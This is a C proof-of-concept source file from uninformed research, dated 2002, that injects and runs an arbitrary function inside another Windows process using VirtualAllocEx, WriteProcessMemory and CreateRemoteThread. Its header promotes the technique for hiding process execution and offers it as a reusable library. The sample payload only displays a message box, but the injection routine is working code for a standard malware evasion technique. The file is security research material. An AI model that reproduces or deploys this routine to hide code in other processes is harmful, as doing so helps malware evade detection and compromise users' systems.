/*
 * uninformed research
 * http://www.uninformed.org
 *
 * This is proof of concept code with a reusable function for injecting arbitrary functions into a process and then execute
 * that function within the context of the process.  This is useful for lots of things, none more obvious than hiding process
 * execution.  This code is however specific to NT as it uses functions such as VirtualAllocEx and CreateRemoteThread.
 *
 * If you want to compile this as a library, simply add /DLIBRARY to the command line and make it not link.
 * This will remove all of the example code and leave you with the startThreadInProcess method.
 *
 * skape
 * 07/23/2002
 * mmiller@hick.org
 *
 * cl hidethread.c /link user32.lib psapi.lib
 *
 */
#define DEBUG

#include <stdlib.h>
#include <stdio.h>

#include <windows.h>

unsigned char startThreadInProcess(DWORD pid, DWORD (WINAPI *threadFunctionStart)(void *), DWORD (WINAPI *threadFunctionEnd)(void *), void *context, unsigned long contextSize);

#ifndef LIBRARY

typedef struct {
	DWORD size;
	char  user32Dll[32];
	char  messageBoxFuncName[32];
	DWORD loadLibraryImport;
	DWORD getProcAddressImport;
} THREAD_FUNCTION_CTX;

static DWORD WINAPI exampleThreadFunction(THREAD_FUNCTION_CTX *ctx);
static DWORD WINAPI exampleThreadFunctionEnd(THREAD_FUNCTION_CTX *ctx);

int main(int argc, char **argv)
{
	THREAD_FUNCTION_CTX ctx;
	DWORD pid;
	HMODULE dll;

	if (argc == 1)
	{
		fprintf(stdout,"Usage: %s [pid]\n", argv[0]);
		return 0;
	}

	pid = strtoul(argv[1], NULL, 10);

	/*
	 * Initialize our context that we pass to the thread with the information we need.
	 */
	memset(&ctx, 0, sizeof(ctx));

	if ((dll = LoadLibrary("kernel32.dll")))
	{
		ctx.loadLibraryImport = (DWORD)GetProcAddress(dll, "LoadLibraryA");
		ctx.getProcAddressImport = (DWORD)GetProcAddress(dll, "GetProcAddress");

		FreeLibrary(dll);
	}
	else
	{
		fprintf(stdout,"Could not open kernel32.dll.\n");
		return 0;
	}

	strcpy(ctx.user32Dll, "user32.dll");
	strcpy(ctx.messageBoxFuncName, "MessageBoxA");

	if (!startThreadInProcess(pid, (DWORD (WINAPI *)(void *))exampleThreadFunction, (DWORD (WINAPI *)(void *))exampleThreadFunctionEnd, &ctx, sizeof(ctx)))
		fprintf(stdout,"Injection of thread failed. (lastError=%lu)\r\n", GetLastError());
	else
		fprintf(stdout,"Successfully injected thread.\r\n");

	return 1;
}

/*
 * Things to know about injected functions:
 *
 *     * You cannot use static buffers or addresses which are non-relative to the binary you're injecting to.
 *       (Meaning you can't do this: char *bob = "blah";)
 *     * You cannot directly call win32 functions.  You have to use addresses relative to the imported address
 *       inside the executable.
 *     * There are a few other quirks that I can't think of at this point, but you get the idea.
 *
 *  My example function depends on two things:
 *     1) The binary MUST have a LoadLibraryA import.
 *     2) The binary MUST have a GetProcAddressA import.
 *
 *  The import addresses are static.  You can determine an import address via few mechanisms such as:
 *  	 1) IDA
 *  	 2) dependency viewer (entry point on imported funcs)
 *		 3) or you could use the imagehlp api and find out the virtual address for a symbol yourself.
 */
static DWORD WINAPI exampleThreadFunction(THREAD_FUNCTION_CTX *ctxaddr)
{
	/*
	 * required imports: LoadLibraryA, GetProcAddressA
	 */
	unsigned long loadLibraryImport = ctxaddr->loadLibraryImport, getProcAddressImport = ctxaddr->getProcAddressImport, messageBoxAddr;
	HMODULE dll;
	char caption[4];
	char text[32];

	caption[0] = 'h';
	caption[1] = 'i';
	caption[2] = 0;

	text[0] = 'i';
	text[1] = 'n';
	text[2] = 'j';
	text[3] = 'e';
	text[4] = 'c';
	text[5] = 't';
	text[6] = 0;

	/*
	 * This assembly does a LoadLibrary on user32.dll and then a GetProcAddress on MessageBoxA.
	 * After that point, it calls MessageBoxA printing 'hi', 'inject'.  This message box
	 * is appearing in the context of the injected process, meaning, it looks as if it's coming
	 * from that process.  Also, I don't FreeLibrary here, mainly because I don't see the need to :)
	 */
	__asm
	{
		mov  ecx, ctxaddr                      ; move the address of ctxaddr into ecx
		add  ecx, 04h                          ; offset into struct of user32.dll
		push ecx                               ; push ctxaddr+04h (ctxaddr->user32Dll)
		call [loadLibraryImport]               ; call LoadLibraryA import
		mov dword ptr [dll], eax               ; move the return value to dll (HMODULE)
		mov  ecx, ctxaddr                      ; move the address of ctxaddr into ecx
		add  ecx, 24h                          ; offset into struct of message box (+36)
		push ecx                               ; second arg, the symbol name MessageBoxA
		push dll                               ; first arg, the handle to the dll
		call [getProcAddressImport]            ; call the GetProcAddressA import
		mov dword ptr [messageBoxAddr], eax    ; move the return value to messageBoxAddr
		push MB_OK                             ; fourth, MB_OK
		lea  ecx, [caption]                    ; get the effective address of caption
		push ecx                               ; third arg, caption
		lea  ecx, [text]                       ; get the effective address of text
		push ecx                               ; second arg, text
		push 0h                                ; first arg of message box, NULL
		call [messageBoxAddr]                  ; call MessageBoxA
	}

	return 1;
}

/*
 * This is here to calculate the length of the exampleThreadFunction for when we copy it.
 */

#pragma warning (disable: 4716)
static DWORD WINAPI exampleThreadFunctionEnd(THREAD_FUNCTION_CTX *ctx)
{
}

#endif

unsigned char startThreadInProcess(DWORD pid, DWORD (WINAPI *threadFunctionStart)(void *), DWORD (WINAPI *threadFunctionEnd)(void *), void *context, unsigned long contextSize)
{
	unsigned char foundPid = 0;
	HANDLE process, threadHndl;
	unsigned char *virtualFunctionBuffer;
	DWORD id, size, numBytes;
	HMODULE dll;

	if (!(process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid)))
		return 0;

	/*
	 * We got here, that means we found the process and have successfully opened it.
	 * Calculate the length of the threadFunction.
	 */
	size = (LPBYTE)threadFunctionEnd - (LPBYTE)threadFunctionStart;

	/*
	 * Allocate enough space for our function and our context.
	 */
	virtualFunctionBuffer = VirtualAllocEx(process, NULL, size + contextSize, MEM_COMMIT | MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);

	/*
	 * Write our function and then our context.
	 */
	WriteProcessMemory(process, virtualFunctionBuffer, (LPVOID)threadFunctionStart, size, &numBytes);
	WriteProcessMemory(process, virtualFunctionBuffer + size, (LPVOID)context, contextSize, &numBytes);

#ifdef DEBUG
	fprintf(stdout,"virtualFunctionBuffer = %.8x len = %d\r\n", virtualFunctionBuffer, size);
#endif

	/*
	 * Create the thread as the process.
	 */
	threadHndl = CreateRemoteThread(process, NULL, 0, (LPTHREAD_START_ROUTINE)virtualFunctionBuffer, virtualFunctionBuffer + size, 0, &id);
	
	CloseHandle(process);

	if (threadHndl)
	{
		CloseHandle(threadHndl);
		return 1;
	}
	else
		return 0;
}
